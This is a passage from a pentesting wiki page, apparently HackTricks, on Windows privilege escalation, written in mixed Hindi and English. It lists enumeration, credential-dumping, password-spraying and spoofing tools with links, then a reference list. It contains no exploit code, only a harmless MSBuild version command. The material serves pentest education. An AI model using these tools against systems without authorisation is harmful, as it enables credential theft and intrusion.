[**PowerSploit-Privesc(PowerUP)**](https://github.com/PowerShellMafia/PowerSploit) **-- Check for misconfigurations and sensitive files (**[**check here**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**). Detected.**\
[**JAWS**](https://github.com/411Hall/JAWS) **-- Check for some possible misconfigurations and gather info (**[**check here**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**).**\
[**privesc** ](https://github.com/enjoiz/Privesc)**-- Check for misconfigurations**\
[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) **-- यह PuTTY, WinSCP, SuperPuTTY, FileZilla, और RDP saved session जानकारी निकालता है। लोकल में -Thorough का उपयोग करें।**\
[**Invoke-WCMDump**](https://github.com/peewpw/Invoke-WCMDump) **-- Credential Manager से crendentials निकालता है। Detected.**\
[**DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray) **-- एकत्रित पासवर्ड्स को domain पर spray करने के लिए**\
[**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) **-- Inveigh एक PowerShell ADIDNS/LLMNR/mDNS spoofer और man-in-the-middle टूल है।**\
[**WindowsEnum**](https://github.com/absolomb/WindowsEnum/blob/master/WindowsEnum.ps1) **-- बेसिक privesc Windows enumeration**\
[~~**Sherlock**~~](https://github.com/rasta-mouse/Sherlock) **~~**~~ -- Search for known privesc vulnerabilities (DEPRECATED for Watson)\
[~~**WINspect**~~](https://github.com/A-mIn3/WINspect) -- लोकल checks **(Need Admin rights)**

**Exe**

[**Watson**](https://github.com/rasta-mouse/Watson) -- Search for known privesc vulnerabilities (needs to be compiled using VisualStudio) ([**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/watson))\
[**SeatBelt**](https://github.com/GhostPack/Seatbelt) -- Host को enumerate करता है और misconfigurations खोजता है (ज़्यादा जानकारी इकट्ठा करने वाला टूल, privesc से ज्यादा) (needs to be compiled) **(**[**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/seatbelt)**)**\
[**LaZagne**](https://github.com/AlessandroZ/LaZagne) **-- कई softwares से credentials निकालता है (github में precompiled exe मौजूद)**\
[**SharpUP**](https://github.com/GhostPack/SharpUp) **-- PowerUp का C# पोर्ट**\
[~~**Beroot**~~](https://github.com/AlessandroZ/BeRoot) **~~**~~ -- Misconfiguration जाँचने के लिए (executable github में precompiled)। सिफारिश नहीं की जाती। यह Win10 पर ठीक से काम नहीं करता।\
[~~**Windows-Privesc-Check**~~](https://github.com/pentestmonkey/windows-privesc-check) -- संभव misconfigurations की जाँच (exe from python). सिफारिश नहीं की जाती। यह Win10 पर अच्छा काम नहीं करता।

**Bat**

[**winPEASbat** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)-- यह टूल इस पोस्ट पर आधारित है (यह accesschk के बिना भी सही काम करता है पर उपयोग कर सकता है)।

**Local**

[**Windows-Exploit-Suggester**](https://github.com/GDSSecurity/Windows-Exploit-Suggester) -- **systeminfo** के आउटपुट को पढ़कर काम करने वाले exploits सुझाता है (लोकल python)\
[**Windows Exploit Suggester Next Generation**](https://github.com/bitsadmin/wesng) -- **systeminfo** के आउटपुट को पढ़कर काम करने वाले exploits सुझाव देता है (लोकल python)

**Meterpreter**

_multi/recon/local_exploit_suggestor_

You have to compile the project using the correct version of .NET ([see this](https://rastamouse.me/2018/09/a-lesson-in-.net-framework-versions/)). To see the installed version of .NET on the victim host you can do:
```
C:\Windows\microsoft.net\framework\v4.0.30319\MSBuild.exe -version #Compile the code with the version given in "Build Engine version" line
```
## संदर्भ

- [http://www.fuzzysecurity.com/tutorials/16.html](http://www.fuzzysecurity.com/tutorials/16.html)
- [http://www.greyhathacker.net/?p=738](http://www.greyhathacker.net/?p=738)
- [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [https://github.com/sagishahar/lpeworkshop](https://github.com/sagishahar/lpeworkshop)
- [https://www.youtube.com/watch?v=_8xJaaQlpBo](https://www.youtube.com/watch?v=_8xJaaQlpBo)
- [https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html](https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
- [https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)
- [https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md](https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md)
- [https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)
- [https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/](https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/)
- [https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)
- [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections)

- [0xdf – HTB/VulnLab JobTwo: Word VBA macro phishing के माध्यम से SMTP → hMailServer credential decryption → Veeam CVE-2023-27532 तक SYSTEM](https://0xdf.gitlab.io/2026/01/27/htb-jobtwo.html)
- [HTB Reaper: Format-string leak + stack BOF → VirtualAlloc ROP (RCE) और kernel token theft](https://0xdf.gitlab.io/2025/08/26/htb-reaper.html)

- [Check Point Research – Chasing the Silver Fox: Kernel Shadows में बिल्ली और चूहे का खेल](https://research.checkpoint.com/2025/silver-fox-apt-vulnerable-drivers/)
- [Unit 42 – Privileged File System Vulnerability Present in a SCADA System](https://unit42.paloaltonetworks.com/iconics-suite-cve-2025-0921/)
- [Symbolic Link Testing Tools – CreateSymlink usage](https://github.com/googleprojectzero/symboliclink-testing-tools/blob/main/CreateSymlink/CreateSymlink_readme.txt)
- [A Link to the Past. Abusing Symbolic Links on Windows](https://infocon.org/cons/SyScan/SyScan%202015%20Singapore/SyScan%202015%20Singapore%20presentations/SyScan15%20James%20Forshaw%20-%20A%20Link%20to%20the%20Past.pdf)
- [RIP RegPwn – MDSec](https://www.mdsec.co.uk/2026/03/rip-regpwn/)
- [RegPwn BOF (Cobalt Strike BOF port)](https://github.com/Flangvik/RegPwnBOF)

{{#include ../../banners/hacktricks-training.md}}
